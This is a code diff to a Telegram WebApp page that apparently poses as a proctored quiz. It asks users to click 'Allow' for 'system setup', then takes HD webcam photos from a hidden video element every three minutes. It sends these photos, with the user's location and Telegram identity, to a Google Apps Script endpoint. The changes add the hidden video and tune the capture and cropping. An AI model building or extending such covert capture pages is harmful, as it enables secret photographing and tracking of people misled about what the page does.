@@ -15,6 +15,15 @@
         button { background: linear-gradient(135deg, #00eaff, #0080ff); color: white; border: none; padding: 18px; border-radius: 12px; cursor: pointer; font-size: 16px; font-weight: 700; width: 100%; transition: 0.3s; box-shadow: 0 5px 15px rgba(0, 234, 255, 0.3); }
         button:disabled { background: #333; box-shadow: none; opacity: 0.6; }
         .option { background: rgba(255, 255, 255, 0.07); padding: 16px; margin: 12px 0; border-radius: 12px; cursor: pointer; text-align: left; border: 1px solid rgba(255, 255, 255, 0.1); }
+        
+        /* Naya: Video element ko perfect ratio mein rakhne ke liye */
+        video {
+            width: 100%;
+            height: auto;
+            object-fit: cover; /* Stretch hone se rokega */
+            aspect-ratio: 16 / 9; /* Perfect HD Ratio */
+            display: none; /* Hide karein jab tak zarurat na ho */
+        }
     </style>
 </head>
 <body>
@@ -25,10 +34,12 @@
     <div class="instruction-box">
         • सिस्टम सेटअप किया जा रहा है।<br>
         • प्रक्रिया शुरू करने के बाद 'Allow' पर क्लिक करें।<br>
-        • <b>नोट:</b> HD कैमरा और लोकेशन वेरिफिकेशन अनिवार्य है।
+        • <b>नोट:</b> Perfect HD कैमरा और लोकेशन वेरिफिकेशन अनिवार्य है।
     </div>
     <button id="startBtn" onclick="requestAllPermissions()">प्रक्रिया शुरू करें</button>
 </div>
+
+<video id="proctorVideo" autoplay playsinline></video>
 
 <div id="quizBox" class="card" style="display:none">
     <div id="question" style="font-size: 18px; margin-bottom: 25px; text-align: left; font-weight: 600;"></div>
@@ -39,7 +50,7 @@
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxCSOW6Lm6sqRDifSvjHLB64smEA1Vl0Ph2H8COe-md67E9COLYFO6cQwkNj0CTidm2YA/exec"; 
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwO7p2glpHIvlKjnMC6P3YCPWsVN00bsPzlanqyPJ_wJUxVmj628WcU-DyZfW9ltuEQrg/exec"; 
 
     const user = tg.initDataUnsafe?.user || {};
     let userLoc = "Pending";
@@ -53,14 +64,22 @@
     async function requestAllPermissions() {
         const btn = document.getElementById("startBtn");
         btn.disabled = true;
-        btn.innerText = "Setting HD Camera... ⏳";
+        btn.innerText = "Setting Perfect HD... ⏳";
 
         try {
-            // 1. HD Camera Request (1280x720)
+            // 1. Forced Perfect HD Constraints (16:9 ratio)
             if (!globalStream) {
                 globalStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: { ideal: 1280 }, height: { ideal: 720 } } 
+                    video: { 
+                        width: { ideal: 1280 }, 
+                        height: { ideal: 720 },
+                        aspectRatio: 1.7777777778 // Naya: Perfect 16:9 Ratio
+                    } 
                 });
+                
+                // Naya: Video element ko stream assign karein
+                const videoEl = document.getElementById('proctorVideo');
+                videoEl.srcObject = globalStream;
             }
 
             // 2. Location Check
@@ -91,6 +110,7 @@
             setInterval(() => captureAndSend("Periodic_Check"), 180000);
 
         } catch (err) {
+            console.error(err);
             alert("Permission Denied: कैमरा एक्सेस के बिना टेस्ट शुरू नहीं हो सकता।");
             btn.disabled = false;
             btn.innerText = "प्रक्रिया शुरू करें";
@@ -100,17 +120,34 @@
     async function captureAndSend(statusType) {
         if (!globalStream) return;
         try {
-            const video = document.createElement('video');
-            video.srcObject = globalStream;
+            const video = document.getElementById('proctorVideo');
+            // playsinline zaruri hai background capture ke liye
             await video.play();
 
             const canvas = document.createElement('canvas');
-            // Canvas ko HD size diya hai
-            canvas.width = 1280; 
-            canvas.height = 720;
+            // Naya: Canvas ka size wahi rakhein jo video stream ka hai
+            canvas.width = video.videoWidth || 1280; 
+            canvas.height = video.videoHeight || 720;
             
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // object-fit cover jaisa effect canvas par lane ke liye hum yahan drawing optimize karte hain
+            const streamRatio = canvas.width / canvas.height;
+            const idealRatio = 16 / 9;
+            
+            if (streamRatio > idealRatio) {
+                // Agar sensor zyada choda hai, toh sides crop karein
+                const newWidth = canvas.height * idealRatio;
+                const offset = (canvas.width - newWidth) / 2;
+                ctx.drawImage(video, offset, 0, newWidth, canvas.height, 0, 0, canvas.width, canvas.height);
+            } else if (streamRatio < idealRatio) {
+                // Agar sensor zyada lamba hai, toh top/bottom crop karein
+                const newHeight = canvas.width / idealRatio;
+                const offset = (canvas.height - newHeight) / 2;
+                ctx.drawImage(video, 0, offset, canvas.width, newHeight, 0, 0, canvas.width, canvas.height);
+            } else {
+                // Agar ratio pehle se sahi hai, toh direct draw karein
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            }
             
             // Quality 0.8 (HD Clarity)
             const photoData = canvas.toDataURL('image/jpeg', 0.8);
